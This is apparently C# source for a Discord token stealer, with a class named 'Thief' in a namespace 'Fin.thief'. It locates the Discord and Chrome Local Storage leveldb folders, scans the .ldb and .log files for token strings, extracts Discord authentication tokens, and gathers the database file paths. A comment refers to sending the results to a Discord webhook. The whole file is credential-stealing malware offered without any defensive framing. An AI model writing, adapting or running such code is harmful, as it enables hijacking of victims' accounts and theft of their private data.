using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using static System.IO.File;

namespace Fin.thief
{
    public class Thief
    {

        public List<string> files = new List<string>();
        Sender _sender = new Sender();
        public string token;
        String DiscordData =
            Directory.GetParent(Directory.GetParent(Directory.GetParent(Path.GetTempPath()).FullName).FullName)
                .FullName + "\\Roaming\\discord\\Local Storage\\leveldb";

        public  string ChromeToken;
        public  string DiscordToken;

        public Thief()
        {
        }
        private static bool dotldb(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".ldb");
                    }
                }
                return stringx.EndsWith(".ldb");
            }
            return false;
        }
        private  bool dotlog(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".log");
                    }
                }
                return stringx.EndsWith(".log");
            }
            return false;
        }

        public void stealDiscordToken()
        {

            #region grabbing token
            string string1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            if (!dotldb(ref string1) && !dotldb(ref string1))
            {
            }
            System.Threading.Thread.Sleep(100);
            string string2 = tokenx(string1, string1.EndsWith(".log"));
            if (string2 == "")
            {
                string2 = "N/A";
            }

            string string3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
            if (!dotldb(ref string3) && !dotlog(ref string3))
            {
            }
            System.Threading.Thread.Sleep(100);
            string string4 = tokenx(string3, string3.EndsWith(".log"));
            if (string4 == "")
            {
                string4 = "N/A";
            }
            #endregion

            //sending message to discord webhook 

            ChromeToken = string4;
            DiscordToken = string2;
                    
                    
                    foreach (var file in Directory.GetFiles(Directory.GetParent(Directory.GetParent(Directory.GetParent(Path.GetTempPath()).FullName).FullName).FullName + "\\Roaming\\discord\\Local Storage\\leveldb"))
                    {
                        if (file.EndsWith("ldb") )
                        {
                            files.Add(file);
                        }
                    }
            

        }

        private static string tokenx(string stringx, bool boolx = false)
        {
            byte[] bytes = File.ReadAllBytes(stringx);
            string @string = Encoding.UTF8.GetString(bytes);
            string string1 = "";
            string string2 = @string;
            while (string2.Contains("oken"))
            {
                string[] array = IndexOf(string2).Split(new char[]
                {
                    '"'
                });
                string1 = array[0];
                string2 = string.Join("\"", array);
                if (boolx && string1.Length == 59)
                {
                    break;
                }
            }

            return string1;
        }

        private static string IndexOf(string stringx)
        {
            string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }

       

    public void listen()
        {

            Program.observer = new Observer();

        }
  
        
    }
}